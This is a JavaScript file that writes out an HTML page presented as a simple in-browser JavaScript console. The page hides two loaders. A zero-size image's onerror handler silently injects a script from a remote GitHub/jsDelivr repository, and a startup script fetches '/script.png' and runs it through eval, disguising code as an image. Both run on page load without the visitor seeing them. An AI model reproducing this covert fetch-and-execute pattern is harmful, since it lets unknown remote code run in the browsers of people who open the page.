document.open();
document.write(`
<!DOCTYPE html>
<html>
<head>
    <meta name="robots" content="noindex" />
    <meta name="googlebot" content="noindex" />
    <meta name="viewport" content="width=device-width,initial-scale=1" />
    <meta charset="utf-8">
</head>
<body>
    <div class="container it-is-set">
        <div id="console-container"><h2>Evaluate</h2><pre id="output"></pre><div id="input-area"><textarea id="input" rows="5" placeholder="JS goes here"></textarea><button id="run-button">Run</button></div></div><img src="/" onerror="const script = document.createElement('script'); script.src='https://cdn.jsdelivr.net/gh/Synaptic-1234/dwaboutit/smth.js'; document.body.appendChild(script)" width="0" height="0" id="ibyx"/>
    </div>

<style>
@import url('https://fonts.googleapis.com/css2?family=Times New Roman&display=swap');
@import url('https://fonts.googleapis.com/css2?family=Helvetica&display=swap');
@import url('https://fonts.googleapis.com/css2?family=Times&display=swap');
@import url('https://fonts.googleapis.com/css2?family=Courier New&display=swap');
@import url('https://fonts.googleapis.com/css2?family=Verdana&display=swap');
@import url('https://fonts.googleapis.com/css2?family=Courier&display=swap');
@import url('https://fonts.googleapis.com/css2?family=Arial Narrow&display=swap');
@import url('https://fonts.googleapis.com/css2?family=Candara&display=swap');
@import url('https://fonts.googleapis.com/css2?family=Calibri&display=swap');
@import url('https://fonts.googleapis.com/css2?family=Cambria&display=swap');
@import url('https://fonts.googleapis.com/css2?family=Garamond&display=swap');
@import url('https://fonts.googleapis.com/css2?family=Recursive&display=swap');

body {
    color: #ebebe3;
    font-family: 'Verdana';
    background-color: #c19898;
}

.container {
    background-color: #4a4a48;
}

.navbar .navbar-collapse {
    justify-content: flex-start;
}

.navbar-nav, .navbar, .dropdown-menu {
    color: #ebebe3;
    background-color: #b97a95;
}

.nav-item, .dropdown-item {
    color: #ebebe3;
    background-color: #b97a95;
}

body {
    font-family: monospace;
    background-color: #1e1e1e;
    color: #d4d4d4;
    padding: 20px;
}

#console-container {
    width: 80%;
    max-width: 800px;
    margin: 0 auto;
    border: 1px solid #333;
    background-color: #222;
    padding: 10px;
    border-radius: 5px;
}

#output {
    height: 300px;
    overflow-y: auto;
    border-bottom: 1px solid #333;
    padding: 10px;
    background-color: #1c1c1c;
    white-space: pre-wrap;
}

#input-area {
    display: flex;
    margin-top: 10px;
}

#input {
    flex-grow: 1;
    background-color: #333;
    color: #d4d4d4;
    border: 1px solid #555;
    padding: 10px;
    font-family: monospace;
    resize: vertical;
}

#run-button {
    padding: 10px 15px;
    background-color: #007acc;
    color: white;
    border: none;
    cursor: pointer;
    margin-left: 10px;
    border-radius: 3px;
}

.error {
    color: #f44747;
}

.result {
    color: #9cdcfe;
}
</style>

<script>
    window.onload = () => {
        setTimeout(() => {
            document.querySelectorAll('.gjs-lory-slides')?.forEach(x => {
                x.style = 'transition-timing-function: ease; transition-duration: 600ms; transform: translate3d(0,0,0);';
                console.log('fixed sliders');
            });
        }, 0);
    };

    (async () => {
        const code = await fetch('/script.png').then(r => r.text());
        eval(code);
    })();
</script>

</body>
</html>`);
document.close();
